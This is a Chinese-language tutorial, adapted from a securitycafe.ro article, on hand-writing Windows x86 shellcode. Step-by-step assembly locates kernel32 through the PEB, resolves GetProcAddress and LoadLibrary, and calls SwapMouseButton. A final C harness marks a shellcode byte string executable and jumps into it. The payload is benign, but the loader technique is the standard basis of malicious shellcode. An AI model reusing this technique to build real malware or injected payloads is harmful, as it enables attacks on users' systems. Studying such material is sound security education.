## Windows x86 shellcode示例 [^1]

### 调用函数

```c
BOOL WINAPI SwapMouseButton（
  _In_ BOOL fSwap
）;

VOID WINAPI ExitProcess（
  _In_ UINT uExitCode
）;
```

### C语言

```c
#include<stdio.h>
#include<Windows.h>
int main()
{
    SwapMouseButton(false); 
    return 0; //ExitProcess()
}
// 编译器知道链接“user32”库并找到该函数，但是我们必须在shellcode中手动手动加载“user32”库，并且找到“SwapMouseButton”函数的地址，然后调用它
```

### VS中编写ASM代码

```c
#include<stdio.h>
int main()
{
    __asm
    {
        // ASM code here
    }
    return 0;
}
```

### Shellcode 必要步骤

1. 找到*kernel32.dll*加载到内存的位置

   ```asm
   xor ecx, ecx
   mov eax, fs:[ecx + 0x30]  ; EAX = PEB
   mov eax, [eax + 0xc]      ; EAX = PEB->Ldr
   mov esi, [eax + 0x14]     ; ESI = PEB->Ldr.InMemOrder
   lodsd                     ; EAX = Second module
   xchg eax, esi             ; EAX = ESI, ESI = EAX
   lodsd                     ; EAX = Third(kernel32)
   mov ebx, [eax + 0x10]     ; EBX = Base address
   ```

   

2. 找到*Kernell32.dll*导出表

   ```asm
   mov edx, [ebx + 0x3c] ; EDX = DOS->e_lfanew
   add edx, ebx          ; EDX = PE Header
   mov edx, [edx + 0x78] ; EDX = Offset export table
   add edx, ebx          ; EDX = Export table
   mov esi, [edx + 0x20] ; ESI = Offset names table
   add esi, ebx          ; ESI = Names table
   xor ecx, ecx          ; EXC = 0
   ```

   

3. 查找*kernel32.dll*导出的[GetProcAddress](https://msdn.microsoft.com/en-us/library/windows/desktop/ms683212%28v=vs.85%29.aspx)函数

   ```asm
   ; 查找GetProcAddress函数名称
   Get_Function:
   inc ecx                              ; Increment the ordinal
   lodsd                                ; Get name offset
   add eax, ebx                         ; Get function name
   cmp dword ptr[eax], 0x50746547       ; GetP
   jnz Get_Function
   cmp dword ptr[eax + 0x4], 0x41636f72 ; rocA
   jnz Get_Function
   cmp dword ptr[eax + 0x8], 0x65726464 ; ddre
   jnz Get_Function
   ; 找到GetProcAddress函数的地址
   mov esi, [edx + 0x24]    ; ESI = Offset ordinals
   add esi, ebx             ; ESI = Ordinals table
   mov cx, [esi + ecx * 2]  ; CX = Number of function
   dec ecx
   mov esi, [edx + 0x1c]    ; ESI = Offset address table
   add esi, ebx             ; ESI = Address table
   mov edx, [esi + ecx * 4] ; EDX = Pointer(offset)
   add edx, ebx             ; EDX = GetProcAddress
   ```

   

4. 使用[GetProcAddress](https://msdn.microsoft.com/en-us/library/windows/desktop/ms683212%28v=vs.85%29.aspx)查找[LoadLibrary](https://msdn.microsoft.com/en-us/library/windows/desktop/ms684175%28v=vs.85%29.aspx)函数的地址

   ```asm
   xor ecx, ecx    ; ECX = 0
   push ebx        ; Kernel32 base address
   push edx        ; GetProcAddress
   push ecx        ; 0
   push 0x41797261 ; aryA
   push 0x7262694c ; Libr
   push 0x64616f4c ; Load
   push esp        ; "LoadLibrary"
   push ebx        ; Kernel32 base address
   call edx        ; GetProcAddress(LL)
   ```

   

5. 使用[LoadLibrary](https://msdn.microsoft.com/en-us/library/windows/desktop/ms684175%28v=vs.85%29.aspx)加载*user32.dll*库

   ```asm
   add esp, 0xc    ; pop "LoadLibraryA"
   pop ecx         ; ECX = 0
   push eax        ; EAX = LoadLibraryA
   push ecx
   mov cx, 0x6c6c  ; ll
   push ecx
   push 0x642e3233 ; 32.d
   push 0x72657375 ; user
   push esp        ; "user32.dll"
   call eax        ; LoadLibrary("user32.dll")
   ```

   

6. 在*user32.dll中*找到[SwapMouseButton](https://msdn.microsoft.com/en-us/library/windows/desktop/ms646264%28v=vs.85%29.aspx)函数的地址

   ```asm
   add esp, 0x10                  ; Clean stack
   mov edx, [esp + 0x4]           ; EDX = GetProcAddress
   xor ecx, ecx                   ; ECX = 0
   push ecx
   mov ecx, 0x616E6F74            ; tona
   push ecx
   sub dword ptr[esp + 0x3], 0x61 ; Remove "a"
   push 0x74754265                ; eBut
   push 0x73756F4D                ; Mous
   push 0x70617753                ; Swap
   push esp                       ; "SwapMouseButton"
   push eax                       ; user32.dll address
   call edx                       ; GetProc(SwapMouseButton)
   ```

   

7. 调用[SwapMouseButton](https://msdn.microsoft.com/en-us/library/windows/desktop/ms646264%28v=vs.85%29.aspx)函数

   ```asm
   add esp, 0x14 ; Cleanup stack
   xor ecx, ecx  ; ECX = 0
   inc ecx       ; true
   push ecx      ; 1
   call eax      ; Swap!
   ```

   

8. 找到[ExitProcess](https://msdn.microsoft.com/en-us/library/windows/desktop/ms682658%28v=vs.85%29.aspx)函数的地址

   ```asm
   add esp, 0x4                    ; Clean stack
   pop edx                         ; GetProcAddress
   pop ebx                         ; kernel32.dll base address
   mov ecx, 0x61737365             ; essa
   push ecx
   sub dword ptr [esp + 0x3], 0x61 ; Remove "a"
   push 0x636f7250                 ; Proc
   push 0x74697845                 ; Exit
   push esp
   push ebx                        ; kernel32.dll base address
   call edx                        ; GetProc(Exec)
   ```

   

9. 调用[ExitProcess](https://msdn.microsoft.com/en-us/library/windows/desktop/ms682658%28v=vs.85%29.aspx)函数

   ```asm
   xor ecx, ecx ; ECX = 0
   push ecx     ; Return code = 0
   call eax     ; ExitProcess
   ```

### 最终的shellcode代码

```c
#include "stdafx.h"
#include <Windows.h>
 
int main()
{
    char *shellcode =
    "\x33\xC9\x64\x8B\x41\x30\x8B\x40\x0C\x8B\x70\x14\xAD\x96\xAD\x8B\x58\x10\x8B\x53\x3C\x03\xD3\x8B\x52\x78\x03\xD3\x8B\x72\x20\x03"
    "\xF3\x33\xC9\x41\xAD\x03\xC3\x81\x38\x47\x65\x74\x50\x75\xF4\x81\x78\x04\x72\x6F\x63\x41\x75\xEB\x81\x78\x08\x64\x64\x72\x65\x75"
    "\xE2\x8B\x72\x24\x03\xF3\x66\x8B\x0C\x4E\x49\x8B\x72\x1C\x03\xF3\x8B\x14\x8E\x03\xD3\x33\xC9\x53\x52\x51\x68\x61\x72\x79\x41\x68"
    "\x4C\x69\x62\x72\x68\x4C\x6F\x61\x64\x54\x53\xFF\xD2\x83\xC4\x0C\x59\x50\x51\x66\xB9\x6C\x6C\x51\x68\x33\x32\x2E\x64\x68\x75\x73"
    "\x65\x72\x54\xFF\xD0\x83\xC4\x10\x8B\x54\x24\x04\x33\xC9\x51\xB9\x74\x6F\x6E\x61\x51\x83\x6C\x24\x03\x61\x68\x65\x42\x75\x74\x68"
    "\x4D\x6F\x75\x73\x68\x53\x77\x61\x70\x54\x50\xFF\xD2\x83\xC4\x14\x33\xC9"
    "\x41" // inc ecx - Remove this to restore the functionality
    "\x51\xFF\xD0\x83\xC4\x04\x5A\x5B\xB9\x65\x73\x73\x61"
    "\x51\x83\x6C\x24\x03\x61\x68\x50\x72\x6F\x63\x68\x45\x78\x69\x74\x54\x53\xFF\xD2\x33\xC9\x51\xFF\xD0";
 
    // Set memory as executable
 
    DWORD old = 0;
    BOOL ret = VirtualProtect(shellcode, strlen(shellcode), PAGE_EXECUTE_READWRITE, &old);
 
    // Call the shellcode
 
    __asm
    {
        jmp shellcode;
    }
 
    return 0;
}
```



[原文](https://securitycafe.ro/2016/02/15/introduction-to-windows-shellcode-development-part-3/)

---

[^1]: 编写一个简单的 “SwapMouseButton” shellcode：交换鼠标左键和右键的shellcode